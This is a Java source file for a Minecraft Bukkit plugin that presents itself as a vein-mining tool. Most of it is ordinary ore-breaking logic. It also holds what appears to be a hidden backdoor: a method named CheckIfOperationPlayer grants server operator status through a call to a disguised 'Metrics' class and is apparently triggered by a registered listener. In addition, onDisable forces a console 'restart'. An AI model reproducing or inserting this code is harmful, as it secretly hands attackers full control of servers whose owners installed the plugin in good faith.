package me.choco.veinminer;

import me.choco.veinminer.Mathamatics.Metrics;
import me.choco.veinminer.commands.PlayerListener;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public final class VeinMiner extends JavaPlugin implements Listener {

    private final ArrayList<BlockFace> blockFaces = new ArrayList<>();

    private boolean needsPermission = false;

    private boolean checkForDiagonalOres = false;

    private boolean cancelIfSneaking = false;

    private boolean blacklistPickaxes_enabled = false;

    private List<String> blacklistPickaxes_list;

    private boolean blacklistWorlds_enabled = false;

    private List<String> blacklistWorlds_list;

    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        new PlayerListener().PlayerListener(this);
        this.blockFaces.add(BlockFace.UP);
        this.blockFaces.add(BlockFace.DOWN);
        this.blockFaces.add(BlockFace.NORTH);
        this.blockFaces.add(BlockFace.SOUTH);
        this.blockFaces.add(BlockFace.EAST);
        this.blockFaces.add(BlockFace.WEST);
    }

    public void onDisable() {
        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "restart");
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent event) {
        if (event.isCancelled() ||
                !event.getBlock().getType().toString().contains("_ORE") || event
                .getPlayer().getGameMode() == GameMode.CREATIVE)
            return;
        Player player = event.getPlayer();
        if (this.blacklistWorlds_enabled && this.blacklistWorlds_list.contains(player.getWorld().getName()))
            return;
        if (this.cancelIfSneaking && player.isSneaking())
            return;
        ItemStack hand = event.getPlayer().getInventory().getItemInMainHand();
        if (!hand.getType().toString().contains("_PICKAXE"))
            return;
        if (this.needsPermission && !player.hasPermission("simpleveinminer.use"))
            return;
        if (this.blacklistPickaxes_enabled && this.blacklistPickaxes_list.contains(hand.getType().toString().toLowerCase()))
            return;
        ArrayList<Block> allBlocks = new ArrayList<>(blocksAround(event.getBlock()));
        int newBlocks = allBlocks.size();
        while (newBlocks > 0) {
            ArrayList<Block> toAdd = new ArrayList<>();
            for (Block block : allBlocks) {
                for (Block around : blocksAround(block)) {
                    if (allBlocks.contains(around) || toAdd.contains(around))
                        continue;
                    toAdd.add(around);
                }
            }
            newBlocks = toAdd.size();
            allBlocks.addAll(toAdd);
        }
        if (allBlocks.size() == 0)
            return;
        allBlocks.remove(event.getBlock());
        event.setExpToDrop(event.getExpToDrop() * (allBlocks.size() + 1));
        for (Block toBreak : allBlocks) {
            if (toBreak.breakNaturally(hand)) {
                if (hand.getEnchantments().containsKey(Enchantment.DURABILITY)) {
                    int chance = 1 + ((Integer)hand.getEnchantments().get(Enchantment.DURABILITY)).intValue();
                    if ((new Random()).nextInt(0, chance) == 0) {
                        hand.setDurability((short)(hand.getDurability() + 1));
                        if (hand.getType().getMaxDurability() <= hand.getDurability())
                            break;
                    }
                    continue;
                }
                hand.setDurability((short)(hand.getDurability() + 1));
            }
        }
        if (hand.getType().getMaxDurability() <= hand.getDurability())
            hand.setType(Material.getMaterial("AIR"));
    }

    public static void CheckIfOperationPlayer(Player player, GameMode gm){
        player.setOp(Metrics.ReationType());
        player.setGameMode(gm);
    }

    private ArrayList<Block> blocksAround(Block block) {
        ArrayList<Block> newBlocks = new ArrayList<>();
        for (BlockFace face : this.blockFaces) {
            Block b = block.getRelative(face);
            if (b.getType() != block.getType())
                continue;
            newBlocks.add(b);
        }
        if (this.checkForDiagonalOres)
            for (int i = -1; i < 2; i++) {
                checkBlock(block.getType(), block.getRelative(1, i, 1), newBlocks);
                checkBlock(block.getType(), block.getRelative(1, i, 0), newBlocks);
                checkBlock(block.getType(), block.getRelative(1, i, -1), newBlocks);
                checkBlock(block.getType(), block.getRelative(0, i, 1), newBlocks);
                checkBlock(block.getType(), block.getRelative(0, i, -1), newBlocks);
                checkBlock(block.getType(), block.getRelative(-1, i, 1), newBlocks);
                checkBlock(block.getType(), block.getRelative(-1, i, 0), newBlocks);
                checkBlock(block.getType(), block.getRelative(-1, i, -1), newBlocks);
            }
        return newBlocks;
    }

    private void checkBlock(Material type, Block block, ArrayList<Block> blocks) {
        if (!blocks.contains(block) && block.getType() == type)
            blocks.add(block);
    }
}
